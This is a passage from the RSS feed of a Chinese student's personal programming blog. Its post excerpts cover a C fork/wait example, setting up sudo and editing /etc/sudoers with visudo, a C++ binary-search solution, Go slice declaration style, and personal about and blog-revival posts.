&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;hello &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">wait&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// wait child exit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;world&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// always get
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// &amp;#34;hello world\n&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Editor for /etc/sudoer</title><link>https://resyon.netlify.app/p/editor-for-/etc/sudoer/</link><pubDate>Sat, 14 Aug 2021 14:26:34 +0800</pubDate><guid>https://resyon.netlify.app/p/editor-for-/etc/sudoer/</guid><description>&lt;p>新建用户，添加至sudo的若干步骤&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">usermod -aG root username
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这时候，我在debian上依旧不行
(这是因为&lt;code>/etc/sudoer&lt;/code>的配置中，并没有指定&lt;code>root&lt;/code>用户组中的成员都可以使用&lt;code>sudo&lt;/code>)&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">adduser useradd root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>还是没用，选择直接编辑&lt;code>/etc/sudoer&lt;/code>,
注意到这个文件的权限
&lt;img src="https://resyon.netlify.app/upload/2021/08/image-45acfb1b60e347239b1a19eaf23609bf.png"
loading="lazy"
alt="image.png"
>
通常使用&lt;code>sudoedit&lt;/code>进行编辑， 这个时候如果出现语法错误，会非常蛋疼，查了&lt;a class="link" href="https://askubuntu.com/questions/73864/how-to-modify-an-invalid-etc-sudoers-file" target="_blank" rel="noopener"
>资料&lt;/a>后发现，
&lt;code>visudo&lt;/code>是个更好的选择，&lt;code>visudo&lt;/code>不会在&lt;code>/etc/sudoer&lt;/code>语法错误时拒绝编辑该文件，还会在保存后语法错误时提示重新编辑
&lt;img src="https://resyon.netlify.app/2"
loading="lazy"
alt="image.png"
>&lt;/p></description></item><item><title>数组</title><link>https://resyon.netlify.app/p/%E6%95%B0%E7%BB%84/</link><pubDate>Fri, 21 May 2021 07:56:13 +0800</pubDate><guid>https://resyon.netlify.app/p/%E6%95%B0%E7%BB%84/</guid><description>&lt;h2 id="binary-searchhttpsleetcode-cncomproblemsbinary-search">&lt;a class="link" href="https://leetcode-cn.com/problems/binary-search/" target="_blank" rel="noopener"
>binary-search&lt;/a>&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span>&lt;span class="cpf">&amp;lt;vector&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">&amp;gt;&amp;amp;&lt;/span> &lt;span class="n">nums&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">target&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">nums&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//这里的类型别用auto, 否则后续
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//mid - 1 可能溢出
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">mid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">j&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nums&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">mid&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">target&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">mid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nums&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">mid&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">target&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mid&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//注意此处 -1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mid&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//以及此处 + 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//否则容易陷入死循环
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Golang切片使用风格</title><link>https://resyon.netlify.app/p/golang%E5%88%87%E7%89%87%E4%BD%BF%E7%94%A8%E9%A3%8E%E6%A0%BC/</link><pubDate>Sun, 09 May 2021 21:54:38 +0800</pubDate><guid>https://resyon.netlify.app/p/golang%E5%88%87%E7%89%87%E4%BD%BF%E7%94%A8%E9%A3%8E%E6%A0%BC/</guid><description>&lt;h2 id="切片声明">切片声明&lt;/h2>
&lt;blockquote>
&lt;p>此前特别喜欢用字面量声明一个切片,
即， &lt;code>slice := []int{}&lt;/code> ,
读了&lt;a class="link" href="https://github.com/gocn/translator/blob/master/2019/w38_uber_go_style_guide.md#zero-value-mutexes-are-valid" target="_blank" rel="noopener"
>uber go 风格指南&lt;/a>后发现，这样其实不大好&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/05/image-4f1f94305ece4de2a7ee4f0c2281e518.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;p>此前总是那样做是担心声明的方式&lt;code>var slice []int&lt;/code>，&lt;code>slice&lt;/code>未初始化，&lt;/p>
&lt;p>然而， 切片的默认值实际是有效的&lt;/p>
&lt;h2 id="切片默认值nil使用">切片默认值(&lt;code>nil&lt;/code>)使用&lt;/h2>
&lt;p>&lt;img src="https://resyon.netlify.app/upload/2021/05/image-d38fa7064a654779b21ba9e53a09a1b1.png"
loading="lazy"
alt="image.png"
>&lt;/p></description></item><item><title>About Resyon</title><link>https://resyon.netlify.app/p/about-resyon/</link><pubDate>Sat, 08 May 2021 13:45:42 +0800</pubDate><guid>https://resyon.netlify.app/p/about-resyon/</guid><description>&lt;h2 id="about-me">About Me&lt;/h2>
&lt;p>关于我，普通的19级在校学生，惯用&lt;code>Golang&lt;/code>/&lt;code>Java&lt;/code>/&lt;code>C&lt;/code>， 不大喜欢&lt;code>Python&lt;/code>， 会整点&lt;code>web&lt;/code>的后端开发，对中间件有些兴趣。业余看些动漫，人生没啥追求，唯一的愿望是快乐。&lt;/p>
&lt;h2 id="about-resyons-world">About Resyon&amp;rsquo;s World&lt;/h2>
&lt;p>关于本站，不会有多少访问量的个人博客，主要用于记录一些个人学习中的笔记.&lt;/p></description></item><item><title>See You Again</title><link>https://resyon.netlify.app/p/see-you-again/</link><pubDate>Thu, 06 May 2021 21:24:40 +0800</pubDate><guid>https://resyon.netlify.app/p/see-you-again/</guid><description>&lt;h2 id="复活">复活&lt;/h2>
&lt;p>原本不打算再写博客，一个是懒，另一个是确实也没啥好写的。
偶然的机会又得用上服务器，单挂个小程序的后端，看着资源利用率，觉得难受，于是这个博客又复活了,还换了个域名。
其实说起博客，更像是自娱自乐的地方，正如站名&lt;code>Resyon's World&lt;/code>，到也无所谓了。&lt;/p>
&lt;h2 id="next">Next?&lt;/h2>
&lt;p>最近有点忙，一个小程序大赛，一个互联网+，但忙里偷闲也能干点自己觉得有意思的
对桌面环境之类的一直有点兴趣，最近研究一下&lt;/p>
&lt;ul>
&lt;li>X11&lt;/li>
&lt;li>X-org&lt;/li>
&lt;li>Do-Chat/Wine&lt;/li>
&lt;/ul></description></item></channel></rss>